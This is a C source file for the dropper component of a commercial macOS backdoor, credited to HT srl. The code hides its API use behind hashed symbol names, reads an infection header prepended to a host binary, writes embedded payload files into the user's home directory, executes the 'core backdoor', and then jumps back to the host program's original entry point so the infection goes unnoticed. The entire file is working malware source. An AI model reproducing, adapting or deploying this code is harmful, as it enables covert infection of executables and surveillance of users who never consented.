/*
 * RCSMac Dropper - Dropper Component
 *  - API resolution
 *    - get dyld_image_count/dyld_get_image_name/dyld_get_image_header from
 *      dyld in memory
 *      - Look for LC_SYMTAB and get all the symbols from there
 *    - cycle through all the loaded images in memory looking for libSystem
 *    - once found, get all the other symbols (c standard library)
 *      - Same method as dyld -> LC_SYMTAB
 *  - Get all the resources info, drop the files and execute the RESOURCE_CORE
 *  - Jump to the original entry point
 *
 *  - At the start of our dropper routine we need to save at least esp state,
 *    subtract our stack size in order to restore it to the original value before
 *    jumping to the original entry point.
 *    This is because after we have executed our dropped file we need to jump
 *    back to the original entryPoint which is, of course, another crt Start
 *    routine which expects a fresh register state (e.g. values that you get at
 *    the real first execution). If we don't restore esp properly we might loose
 *    our env of course, or even worst, we might generate a crash.
 *
 * Created by Alfredo 'revenge' Pesoli on 24/07/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#include <stdio.h>
#include <sys/stat.h>

#include "RCSMacDropper.h"
#include "RCSMacCommon.h"

#define DYLD_IMAGE_BASE 0x8FE00000
#define O_RDWR          0x0002
#define O_CREAT         0x0200
#define O_TRUNC         0x0400
#define RTLD_DEFAULT    ((void *) - 2)

#define	PROT_READ       0x01    /* [MC2] pages can be read */
#define	PROT_WRITE      0x02    /* [MC2] pages can be written */
#define	MAP_SHARED      0x0001  /* [MF|SHM] share changes */

void dropperStart ()
{
}

void doExit ()
{
  // exit (0)
  __asm__ __volatile__ (
                        "xorl %eax, %eax\n"
                        "push %eax\n"
                        "inc %eax\n"
                        "push %eax\n"
                        "int $0x80\n"
                        );  
}

static unsigned long
sdbm (unsigned char *str)
{
  unsigned long hash = 0;
  int c;
  
  while ((c = *str++))
    hash = c + (hash << 6) + (hash << 16) - hash;
  
  return hash;
}

unsigned int
findSymbol (void *imageBase, unsigned int symbolHash)
{
  struct mach_header *mh_header       = NULL;
  struct load_command *l_command      = NULL; 
  struct nlist *sym_nlist             = NULL; 
  struct symtab_command *sym_command  = NULL;
  struct segment_command *seg_command = NULL;

  char *symbolName = NULL;

  int offset, i, found, stringOffset; 

  unsigned int linkeditHash = 0xf51f49c4; // "__LINKEDIT" sdbm hashed
  unsigned int hash;

  offset = found = 0; 
  mh_header = imageBase; 
  offset += sizeof (struct mach_header);

  for (i = 0; i < mh_header->ncmds; i++)
    {
      l_command = imageBase + offset; 

      if (l_command->cmd == LC_SEGMENT)
        {
          if (found)
            {
              offset += l_command->cmdsize;
              continue;
            }

          seg_command = imageBase + offset;

          if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
            found = 1;
        }
      else if (l_command->cmd == LC_SYMTAB)
        {
          sym_command = imageBase + offset; 

          if (found)
            break;
        }

      offset += l_command->cmdsize;
    }

  offset = sym_command->symoff - seg_command->fileoff + seg_command->vmaddr;
  stringOffset = sym_command->stroff - seg_command->fileoff + seg_command->vmaddr; 

  for (i = 0; i < sym_command->nsyms; i++)
    {
      sym_nlist = (struct nlist *)offset;
      offset += sizeof (struct nlist);

      symbolName = (char *)(sym_nlist->n_un.n_strx + stringOffset);
      hash = sdbm ((unsigned char *)symbolName);

#ifdef LOADER_DEBUG_VERBOSE
      printf ("[ii] SYMBOL: %s\n", symbolName);
#endif
      if (hash == symbolHash)
        {
#ifdef LOADER_DEBUG
          printf ("[ii] Symbol Found\n");
          printf ("[ii] SYMBOL: %s\n", symbolName);
          printf ("[ii] address: %x\n", sym_nlist->n_value);
#endif
          return sym_nlist->n_value;
        }
    }

  return -1;
}

void labelTest ()
{
}

void secondStageDropper ()
{
  unsigned long dlsymAddress;
  int fd;
  
  unsigned char crtStart[] = "\x6a\x00\x89\xe5\x83\xe4\xf0\x83\xec"
                             "\x10\x8b\x5d\x04\x89\x5c\x24\x00\x8d"
                             "\x4d\x08\x89\x4c\x24\x04\x83\xc3\x01"
                             "\xc1\xe3\x02\x01\xcb\x89\x5c\x24\x08"
                             "\x8b\x03\x83\xc3\x04\x85\xc0\x75\xf7"
                             "\x89\x5c\x24\x0c\xe8\x90\x90\x90";
  
  const char *imageName       = NULL;
  void *baseAddress           = NULL;
  int imageCount, z           = 0;
  
  __asm__ __volatile__ (
                        "movl 4(%%ebp), %%eax\n"
                        "subl $0x76, %%eax\n"
                        "movl %%eax, %0\n"
                        : "=m"(baseAddress)
                        :
                        );
  
  unsigned int	eax;
  unsigned int	ecx;
  unsigned int	edx;
  unsigned int	edi;
  unsigned int	esi;
  unsigned int	ebp;
  unsigned int	esp;
  
  //
  // Save register state in order to avoid a crash jumping in the real crt start
  //
  __asm__ __volatile__ (
                        "movl %%eax, %0\n"
                        "movl %%ecx, %1\n"
                        "movl %%edx, %2\n"
                        "movl %%edi, %3\n"
                        : "=m"(eax), "=m"(ecx), "=m"(edx), "=m"(edi)
                        :
                        );

  __asm__ __volatile__ (  
                        "movl %%esi, %0\n"
                        "movl %%ebp, %1\n"
                        "movl %%esp, %2\n"
                        : "=m"(esi), "=m"(ebp), "=m"(esp)
                        :
                        );
  
  esp += 0x1c4 + 0x28; // restoring esp
  
#ifndef LOADER_DEBUG
  int i, pid = 0;
  
  char *userHome              = NULL;
  char *destinationDir        = NULL;
  char *filePointer           = NULL;
  char *backdoorPath          = NULL;
  
  unsigned int offset = (unsigned int)(baseAddress) + sizeof (infectionHeader);
  
  infectionHeader *infection  = (infectionHeader *)baseAddress;
  stringTable *stringList     = (stringTable *)offset;
  resourceHeader *resource    = NULL;
  char *strings[16];
#endif
  
  //
  // lib/function name hashes
  //
  unsigned int libSystemHash              = 0x7e38c256; // /usr/lib/libSystem.B.dylib
  
  unsigned int dlsymHash                  = 0x9cc75880; // _dlsym sdbm hash
  unsigned int dyld_image_countHash       = 0x9100a119; // __dyld_image_count
  unsigned int dyld_get_image_nameHash    = 0x1327d26a; // __dyld_get_image_name
  unsigned int dyld_get_image_headerHash  = 0xe8cdb2cc; // __dyld_get_image_header
  
  unsigned int openHash     = 0x98b7a5e9; // _open
  unsigned int lseekHash    = 0xfae127c5; // _lseek
  unsigned int closeHash    = 0x56dcb9f9; // _close
  unsigned int pwriteHash   = 0xac6aa4ce; // _pwrite
  unsigned int statHash     = 0x54c725f3; // _stat
  unsigned int mmapHash     = 0x3a2bd4ee; // _mmap
  unsigned int memcpyHash   = 0xb7ac6156; // _memcpy
  unsigned int sprintfHash  = 0xf771588d; // _sprintf
  unsigned int printfHash   = 0xb885c098; // _printf
  unsigned int getenvHash   = 0x794bed96; // _getenv
  unsigned int mkdirHash    = 0xca1cf250; // _mkdir
  unsigned int execveHash   = 0x9ca3dfdf; // _execve
  unsigned int execlHash    = 0x80aa1fc;  // _execl
  unsigned int forkHash     = 0xf58942e1; // _fork
  unsigned int strncpyHash  = 0x335645d0; // _strncpy
  unsigned int mallocHash   = 0x7de19fc7; // _malloc
  unsigned int freeHash     = 0xf6f66e2b; // _free
  unsigned int sleepHash    = 0x90a80b98; // _sleep
  
  //
  // dyld function pointer prototypes
  //
  uint32_t (*_idyld_image_count)                        (void);
  const char *(*_idyld_get_image_name)                  (uint32_t);
  const struct mach_header *(*_idyld_get_image_header)  (uint32_t);
  
  //
  // libSystem function pointer prototypes
  //
  int   (*iopen)     ();
  long  (*ilseek)    (int, off_t, int);
  int   (*iclose)    (int);
  int   (*ipwrite)   (int, const void *, int, off_t);
  int  *(*istat)     (const char *, struct stat *);
  void *(*immap)     (void *, unsigned long, int, int, int, off_t);
  void *(*imemcpy)   (void *, const void *, int);
  int   (*isprintf)  (char *, const char *, ...);
  int   (*iprintf)   (const char *, ...);
  char *(*igetenv)   (const char *);
  int   (*imkdir)    (const char *, unsigned int);
  int   (*iexecve)   (const char *, char *, char *);
  int   (*iexecl)    (const char *, const char *, ...);
  int   (*ifork)     (void);
  char *(*istrncpy)  (char *, const char *, size_t);
  void *(*imalloc)   (int);
  void  (*ifree)     (void *);
  unsigned int (*isleep) (unsigned int);
  
  //
  // Obtain _dlsym address from dyld mapped image
  // If not found, jump directly to the original EP
  //
  dlsymAddress = findSymbol ((void *)DYLD_IMAGE_BASE, dlsymHash);
  _idyld_image_count = (void *)(findSymbol ((void *)DYLD_IMAGE_BASE, dyld_image_countHash));
  
  if ((int)_idyld_image_count != -1)
    {
      imageCount = _idyld_image_count ();
#ifdef LOADER_DEBUG
      printf ("[ii] imageCount: %d\n", imageCount);
#endif
      _idyld_get_image_name = (void *)(findSymbol ((void *)DYLD_IMAGE_BASE, dyld_get_image_nameHash));
      
      if ((int)_idyld_get_image_name != -1)
        {
          for (z = 0; z < imageCount; z++)
            {
              imageName = _idyld_get_image_name (z);
#ifdef LOADER_DEBUG
              printf ("[ii] image: %s\n", imageName);
#endif
              if (sdbm ((unsigned char *)imageName) == libSystemHash)
                {
                  _idyld_get_image_header = (void *)(findSymbol ((void *)DYLD_IMAGE_BASE, dyld_get_image_headerHash));
                  
                  if ((int)_idyld_get_image_header != -1)
                    {
                      const struct mach_header *m_header = NULL;
                      
                      m_header = _idyld_get_image_header (z);
                      
                      iopen     = (void *)(findSymbol ((void *)m_header, openHash));
                      ilseek    = (void *)(findSymbol ((void *)m_header, lseekHash));
                      iclose    = (void *)(findSymbol ((void *)m_header, closeHash));
                      ipwrite   = (void *)(findSymbol ((void *)m_header, pwriteHash));
                      istat     = (void *)(findSymbol ((void *)m_header, statHash));
                      immap     = (void *)(findSymbol ((void *)m_header, mmapHash));
                      imemcpy   = (void *)(findSymbol ((void *)m_header, memcpyHash));
                      isprintf  = (void *)(findSymbol ((void *)m_header, sprintfHash));
                      iprintf   = (void *)(findSymbol ((void *)m_header, printfHash));
                      igetenv   = (void *)(findSymbol ((void *)m_header, getenvHash));
                      imkdir    = (void *)(findSymbol ((void *)m_header, mkdirHash));
                      iexecve   = (void *)(findSymbol ((void *)m_header, execveHash));
                      iexecl    = (void *)(findSymbol ((void *)m_header, execlHash));
                      ifork     = (void *)(findSymbol ((void *)m_header, forkHash));
                      istrncpy  = (void *)(findSymbol ((void *)m_header, strncpyHash));
                      imalloc   = (void *)(findSymbol ((void *)m_header, mallocHash));
                      ifree     = (void *)(findSymbol ((void *)m_header, freeHash));
                      isleep    = (void *)(findSymbol ((void *)m_header, sleepHash));
                    }
                  
                  break;
                }
            }
          
#ifndef LOADER_DEBUG
          for (i = 0; i < infection->numberOfStrings; i++)
            {
              strings[i] = stringList->value;
              offset += sizeof (stringTable);
              stringList = (stringTable *)offset;
            }
          
          offset = (unsigned int)baseAddress
                    + infection->dropperSize
                    + sizeof (infectionHeader)
                    + sizeof (stringTable) * infection->numberOfStrings
                    + sizeof (crtStart);
          
          void *envVariableName = (char *)strings[0];
          
          if (igetenv != 0)
            userHome = igetenv (envVariableName);
          else
            doExit ();
          
          backdoorPath = imalloc (256);
          
          //
          // Cycle through and drop all the resources
          //
          for (i = 0; i < infection->numberOfResources; i++)
            {
              char *destinationPath = imalloc (256);
              destinationDir  = imalloc (128);
              
              resource = (resourceHeader *)offset;
              
              isprintf (destinationDir, strings[1], userHome, resource->path);
              imkdir (destinationDir, 0755);
              
              isprintf (destinationPath, strings[1], destinationDir, resource->name);
              
              if (resource->type == RESOURCE_CORE)
                {
                  istrncpy (backdoorPath, destinationPath, 256);
                }
              
              if ((fd = iopen (destinationPath, O_RDWR | O_CREAT | O_TRUNC, 0755)) >= 0)
                {
                  if ((int)(filePointer = immap (0, resource->size, PROT_READ | PROT_WRITE,
                                                 MAP_SHARED, fd, 0)) != -1)
                    {
                      if (ipwrite (fd, strings[3], 1, resource->size - 1) == -1)
                        {
                          iclose (fd);
                          doExit ();
                        }
                      
                      offset += sizeof (resourceHeader);
                      imemcpy (filePointer,
                               (void *)offset,
                               resource->size);
                    }
                  
                  iclose (fd);
                }
              
              offset += resource->size;
              
              ifree (destinationDir);
              ifree (destinationPath);
            }
          
          //
          // Execute the core backdoor file
          //
          if ((pid = ifork()) == 0)
            {
              iexecl (backdoorPath, strings[3], NULL, NULL, NULL);
            }
          else if (pid > 0)
            {
              // jump to the original entry point
              
              //doExit ();
            }
          else if (pid < 0)
            {
              //__asm__ __volatile__ ("int $0x3\n");
              //doExit ();
            }
          
          ifree (backdoorPath);
          
          //
          // Restore register state and jump to the original entrypoint
          //
          __asm__ __volatile__ (
                                "movl  %0, %%eax\n"
                                "movl  $0x1000, %%ebx\n"
                                "movl  $0x5, %%ecx\n"
                                :
                                :"m"(infection->originalEP)
                                );
          
          __asm__ __volatile__ (
                                "movl  %0, %%esp\n"
                                "jmp   *%%eax\n"
                                :
                                :"m"(esp)
                                );
#endif          
        }
    }
}

#ifdef LOADER_DEBUG
int main()
{
  secondStageDropper();
  return 0;
}
#endif

void dropperEnd ()
{
}
